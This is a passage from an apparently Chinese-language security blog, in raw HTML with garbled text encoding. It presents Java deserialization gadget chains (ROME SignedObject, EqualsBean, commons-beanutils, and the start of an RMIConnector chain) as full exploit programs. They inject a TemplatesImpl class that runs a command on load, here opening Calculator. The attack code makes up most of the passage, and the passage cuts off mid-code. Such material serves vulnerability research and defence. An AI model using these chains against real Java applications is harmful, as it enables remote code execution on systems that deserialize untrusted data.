com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.time.temporal.Temporal;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_SignedObject_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        ct.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        ct.setName(randomClassName);</span><br><span class="line">        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">return</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getPayload</span><span class="params">(Class clazz, Object obj)</span> &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(clazz, obj));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;rand&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilClass().toBytecode()&#125;;</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> getPayload(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> getPayload(SignedObject.class, signedObject);</span><br><span class="line">        Unser(hashMap2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚çš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼š<code>hashMap2:readObject()-&gt;signedObject:getObject-&gt;hashMap1:readObject</code></p><h3 id="EqualsBeané“¾"><a href="#EqualsBeané“¾" class="headerlink" title="EqualsBeané“¾"></a>EqualsBeané“¾</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_SignedObject_EqualsBean_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        ct.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        ct.setName(randomClassName);</span><br><span class="line">        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">return</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getPayload</span><span class="params">(Class clazz, Object obj)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;s&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, obj);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, obj);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        table.put(map2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_beanClass&quot;</span>, clazz);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_obj&quot;</span>, obj);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException, SignatureException, InvalidKeyException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilClass().toBytecode()&#125;;</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table1</span> <span class="operator">=</span> getPayload(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table2</span> <span class="operator">=</span> getPayload(SignedObject.class, signedObject);</span><br><span class="line">        Unser(table2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="commons-beanutilsé“¾"><a href="#commons-beanutilsé“¾" class="headerlink" title="commons-beanutilsé“¾"></a>commons-beanutilsé“¾</h2><p>å…·ä½“åŸç†å‚è€ƒ<a href="https://www.yuque.com/zqiangweihuakai/ybltae/gpgxvbbuk5ughk6w">Java ååºåˆ—åŒ–</a>è¿™é‡Œæœ‰ä»‹ç»cbé“¾çš„åŸç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb_SignedObject_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        ct.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        ct.setName(randomClassName);</span><br><span class="line">        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">return</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue&lt;Object&gt; <span class="title function_">getPayload</span><span class="params">(Object object, String string)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, string);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> priorityQueue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilClass().toBytecode()&#125;;</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> getPayload(templatesImpl,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(queue, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = getPayload(signedObject,<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        Unser(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RMIConnectoré“¾"><a href="#RMIConnectoré“¾" class="headerlink" title="RMIConnectoré“¾"></a>RMIConnectoré“¾</h2><p>è¿™ä¸ªRMIConnectorç±»ä¸­çš„findRMIServerJRMPæ–¹æ³•å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–çš„æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308365583-c99f4793-6236-4283-8dda-13732b4d1217.png"></p><p>è¿™é‡Œæ˜¯ä¼šå°†base64è½¬æ¢æˆå­—èŠ‚ç è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>ä¸‹é¢å°±æ˜¯çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªfindRMIServerJRMPæ–¹æ³•ï¼Œå¯ä»¥æ‰¾åˆ°åœ¨å…¶åŒç±»ä¸‹çš„findRMIServeræ–¹æ³•<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308439632-e71cc486-5adb-4e27-9d75-e9faa534cfe4.png"></p><p>çœ‹ä¸€ä¸‹æºç è§£é‡Šä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308486076-54ea5b31-cbc9-4c8f-b6b5-237a630808f5.png"></p><p>å¯ä»¥çœ‹åˆ°è¯¥æ–¹æ³•æ¥å—äº†ä¸€ä¸ªJMXServiceURLç±»çš„å‚æ•°å’Œä¸€ä¸ªMapï¼Œå…ˆè°ƒç”¨isIiopURLåˆ¤æ–­directoryURLçš„åè®®ç±»å‹æ˜¯RMIè¿˜æ˜¯IIOPï¼Œè¿™é‡Œçš„åˆ¤æ–­æ–¹æ³•æ˜¯è·å–protocolå±æ€§è¿›è¡Œåˆ¤æ–­ï¼Œprotocolåœ¨æ„é€ JMXServiceURLçš„æ—¶å€™å–å‡ºservice:jmx:åé¢éƒ¨åˆ†èµ‹å€¼ç»™protocolã€‚å¦‚æœå®ƒæ˜¯iiopåè®®ï¼Œä¼šæŠŠjava.naming.corba.orbå­—ç¬¦å’Œç±»æ”¾å…¥åˆ°mapä¸­ã€‚æœ€ç»ˆä»directoryURLä¸­è·å–urlPathçš„å†…å®¹ï¼Œå–å‡º;çš„ç´¢å¼•ä½ç½®ï¼Œå¦‚æœä¸å­˜åœ¨; ï¼ŒæŠŠendèµ‹å€¼ä¸ºæ•´ä¸ªé•¿åº¦ï¼Œåˆ¤æ–­pathæ˜¯ä»¥&#x2F;jndi&#x2F; &#x2F;stub&#x2F;ç­‰èµ·å§‹è¿›å…¥ä¸åŒçš„æ–¹æ³•å¹¶æŠŠ&#x2F;jndi&#x2F; &#x2F;stub&#x2F;å¯¹åº”çš„å­—ç¬¦ä¸²å»æ‰ã€‚æ­¤å¤„è¦è§¦å‘äºŒæ¬¡ååºåˆ—åŒ–ï¼Œéœ€è¦ä»¤findRMIServerè¿›å…¥findRMIServerJRMPï¼Œæ‰€ä»¥è¦ä¼ å…¥çš„urlPathä»¥&#x2F;stub&#x2F;å¼€å¤´å¹¶ä¸”æ˜¯rmiåè®®ã€‚</p><p>å†å»å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†findRMIServeræ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308686794-9596a0bd-6842-4472-b2bb-71dfe3c9a425.png"></p><p>è¿˜æ˜¯åœ¨å…¶åŒç±»ä¸‹çš„connectæ–¹æ³•ä¸­ä¼šè°ƒç”¨åˆ°è¯¥æ–¹æ³•è·Ÿè¿›æºä»£ç çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308774976-4d7e7679-8f2e-40c6-ae46-7f80c34da66c.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æœ‰è¿™ä¸ªæ–¹æ³•çš„ã€‚è¿™é‡Œè°ƒç”¨è¯¥æ–¹æ³•çš„æ¡ä»¶æ˜¯rmiServerä¸ºç©ºï¼Œè¿™é‡Œçš„jmxServiceURLå¯ä»¥é€šè¿‡åå°„è¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span 